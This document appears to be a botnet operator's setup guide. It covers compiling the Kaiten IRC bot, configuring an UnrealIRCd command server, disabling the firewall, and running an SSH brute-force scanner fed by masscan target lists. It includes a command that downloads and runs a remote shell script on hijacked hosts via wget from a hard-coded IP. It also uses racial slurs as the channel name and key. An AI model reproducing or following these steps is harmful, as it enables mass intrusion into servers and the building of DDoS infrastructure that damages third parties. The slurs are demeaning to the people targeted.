
# ___     __________  ____ _______      _____ _______________.___.  ___     
# / _ \_/\ \______   \/_   |\      \    /  _  \\______   \__  |   | / _ \_/\ 
# \/ \___/  |    |  _/ |   |/   |   \  /  /_\  \|       _//   |   | \/ \___/ 
#           |    |   \ |   /    |    \/    |    \    |   \\____   |          
#           |______  / |___\____|__  /\____|__  /____|_  // ______|          
#                  \/              \/         \/       \/ \/                 

*NOTE: THE VPS MUST BE RUNNING CENTOS 6x x64bit
*RUN THESES FIRST OR IT WILL NOT WORK*

#
#  ___     .______________________    ___     
# / _ \_/\ |   \______   \_   ___ \  / _ \_/\ 
# \/ \___/ |   ||       _/    \  \/  \/ \___/ 
#          |   ||    |   \     \____          
#          |___||____|_  /\______  /          
#                      \/        \/           
#					  
					  
##################################
###########DEPENDENCIES###########
##################################

yum install perl
yum install gcc
yum install gcc-c++
yum intsall httpd
yum install tftp
yum install cpan
yum install nano
yum install unzip
yum install tar

##################################
########### SETTING UP ###########
########### THE KAITEN ###########
##################################

cd /var/www/html
upload NSA-edit.sh
upload g.c (kaiten.c)
edit g.c
find this line >>> #define CHAN "#Niggers"
replace "#Niggers" with the prefered channel name
find this line >>> #define KEY "nigg@s"
replace "nigg@s" with the prefered channel key
find this >>> char *servers[] = {
				"23.89.158.69",
				(void*)0
				};
<<<

##################################
########### SETTING UP ###########
########### THE UNREAL ###########
##################################

upload Unreal3.2.10.6.tar
tar -xf Unreal3.2.10.6.tar
cd Unreal3.2.10.6
upload the unrealircd.conf i gave you
edit the unrealircd.conf
find this line >>> listen *:443;
change "443" to "6667"
change the oper lines in the config file--these lines>>>
											oper "Christian"
											password "Christian#!";
											oper "" {
											password "DICKS";
											oper "Tragedy" {
											password "nigg@s123";
<<<<
save the changes to unrealircd.conf
run this command >>> ./Config
after that finishes run this command >>> make
then type >>> ./unreal start
if succesful should say this >>>

 _   _                      _ ___________  _____     _
| | | |                    | |_   _| ___ \/  __ \   | |
| | | |_ __  _ __ ___  __ _| | | | | |_/ /| /  \/ __| |
| | | | '_ \| '__/ _ \/ _` | | | | |    / | |    / _` |
| |_| | | | | | |  __/ (_| | |_| |_| |\ \ | \__/\ (_| |
 \___/|_| |_|_|  \___|\__,_|_|\___/\_| \_| \____/\__,_|
                           v3.2.10.6
                     using TRE 0.8.0 (BSD)

* Loading IRCd configuration ..
[warning] unrealircd.conf:61: listen with SSL flag enabled on a non SSL compile
* Configuration loaded without any problems ..
* Dynamic configuration initialized .. booting IRCd.
---------------------------------------------------------------------

<<<
then run this command >>> service iptables stop
then this >>> service httpd restart

#  ___       __________________     _____    _______    _______  _____________________   ___     
# / _ \_/\  /   _____/\_   ___ \   /  _  \   \      \   \      \ \_   _____/\______   \ / _ \_/\ 
# \/ \___/  \_____  \ /    \  \/  /  /_\  \  /   |   \  /   |   \ |    __)_  |       _/ \/ \___/ 
#           /        \\     \____/    |    \/    |    \/    |    \|        \ |    |   \          
#          /_______  / \______  /\____|__  /\____|__  /\____|__  /_______  / |____|_  /          
#                  \/         \/         \/         \/         \/        \/         \/    
#

##################################
###########AUTOMATICALY###########
##SETTING UP SCANNING DEPENDCIES##
##################################

cd /root/
upload Scanner.sh
type this command
sh Scanner.sh

##################################
#############MANUALLLY############
#######SETTING UP DEPENDCIES######
##################################

yum install gcc php-devel php-pear libssh2 libssh2-devel

pecl install -f ssh2 
enter 

touch /etc/php.d/ssh2.ini

echo extension=ssh2.so > /etc/php.d/ssh2.ini
yum install cpan -y
cpan force install Net::SSH2
cpan force install Parallel::ForkManager

##################################
######SETTING UP THE SCANNER######
##################################

cd /root/
mkdir bin
upload LRAB
unzip LRAB.zip
nano join.pl
look for wget line should look like this	>>>>	$channel->exec('cd /tmp ; wget http://153.92.127.63/gtop.sh ; chmod +x gtop.sh ; sh gtop.sh ; rm gtop.sh');
change the ip with your server ip
save it
now execute to exucute the lists
they are exucuted like this
perl join.pl <filename.txt>

#
#  ___        _____      _____   ____  __.___ _______    ________  .____    .___  _____________________________  ___     
# / _ \_/\   /     \    /  _  \ |    |/ _|   |\      \  /  _____/  |    |   |   |/   _____/\__    ___/   _____/ / _ \_/\ 
# \/ \___/  /  \ /  \  /  /_\  \|      < |   |/   |   \/   \  ___  |    |   |   |\_____  \   |    |  \_____  \  \/ \___/ 
#          /    Y    \/    |    \    |  \|   /    |    \    \_\  \ |    |___|   |/        \  |    |  /        \          
#          \____|__  /\____|__  /____|__ \___\____|__  /\______  / |_______ \___/_______  /  |____| /_______  /          
#                  \/         \/        \/           \/        \/          \/           \/                  \/           
#

##################################
#########MAKING NEW LISTS#########
##################################
***you use mass scan to create new lists***
**NOTE: YOU MUST HAVE A KVM SERVER FOR MASSCAN TO WORK***


./masscan 173.0.63.196/8 -p22 --rate 10000 -oG ips.txt
grep -oP '(?<=Host: )\S*' ips.txt > mfu.txt

./update 1000

Wait for that to finish

perl w.pl vulns.txt